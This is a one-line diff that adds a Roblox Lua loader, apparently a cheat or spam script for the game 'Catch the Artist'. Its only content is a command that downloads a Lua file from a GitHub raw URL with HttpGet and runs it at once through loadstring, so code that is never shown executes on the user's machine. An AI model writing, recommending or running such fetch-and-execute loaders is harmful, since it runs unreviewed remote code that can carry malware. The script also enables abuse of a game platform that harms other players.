@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/catch-the-artist-spam6-vr58jfh3o3lrgr.lua"))()
